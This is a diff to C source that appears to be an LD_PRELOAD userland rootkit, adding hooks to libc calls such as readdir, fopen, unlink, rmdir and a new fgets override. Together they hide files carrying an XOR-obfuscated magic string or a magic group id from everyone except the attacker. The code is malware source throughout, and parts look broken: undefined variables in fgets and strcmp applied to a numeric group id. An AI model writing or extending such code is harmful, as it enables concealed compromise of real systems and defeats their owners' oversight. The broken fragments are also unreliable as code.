@@ -242,6 +242,7 @@ int link(const char *oldpath, const char *newpath)
 	
 	char *magic = strdup(MAGIC); xor(magic);
 	struct stat filestat; 
+	HOOK(stat);
 	old_stat(oldpath, &filestat);
 	if (owned())
 	{ 
@@ -264,6 +265,7 @@ int unlink(const char *path)
 	
 	char *magic = strdup(MAGIC); xor(magic);
 	struct stat filestat; 
+	HOOK(stat);
 	old_stat(path, &filestat); 
 	if (owned())
 	{
@@ -286,6 +288,7 @@ int symlink(const char *path1, const char *path2)
 	
 	char *magic = strdup(MAGIC); xor(magic);
 	struct stat filestat1, filestat2; 
+	HOOK(stat);
 	old_stat(path1, &filestat1); 
 	old_stat(path2, &filestat2); 
 	if (owned())
@@ -310,7 +313,9 @@ struct dirent *readdir(DIR *dirp)
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct dirent *dir; 
 	struct stat s_fstat; 
-	memset(&s_fstat, 0, sizeof(stat)); 
+	CLEAN(s_fstat); 
+	HOOK(__xstat);
+	if (owned()) return old_readdir(dirp);
 	do
 	{ 
 		dir = old_readdir(dirp); 
@@ -391,8 +396,10 @@ int rmdir(const char *pathname)
 	#endif 
 
 	char *magic = strdup(MAGIC); xor(magic); 
+
 	struct stat filestat; 
-	old_stat(pathname, &filestat); 
+	HOOK(stat);
+	old_stat(pathname, &filestat);	
 	if (owned())
 	{ 
 		if (strstr(pathname, magic) || !strcmp(filestat.st_gid, MAGICGID))
@@ -454,6 +461,7 @@ FILE *fopen(const char *pathname, const char *mode)
 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
+	HOOK(stat);
 	old_stat(pathname, &filestat); 
 	if (owned())
 	{ 
@@ -466,6 +474,36 @@ FILE *fopen(const char *pathname, const char *mode)
 	} 
 	return old_fopen(pathname, mode); 
 } 
+
+char *fgets(char *s, int size, FILE *stream)
+{ 
+	int i; 
+	struct stat filestat;
+	char *p; 
+	char *x;
+
+	HOOK(fgets); 
+	p = old_fgets(s, size, stream);
+	if (p == NULL)
+		return(p);
+	if (owned())
+		return old_fgets(buf, buf_size, fp);
+	HOOK(access); 
+	HOOK(stat);
+	if (old_access(s, F_OK) != -1)
+	{ 
+		old_stat(s, &filestat); 
+		char *magic = strdup(MAGIC); xor(magic);
+		if (!strcmp(filestat.st_gid, MAGICGID))
+		{ 
+			return NULL; 
+		}
+		else
+			return p;
+	}
+	return p;
+}		
+
 
 void init(void)
 { 
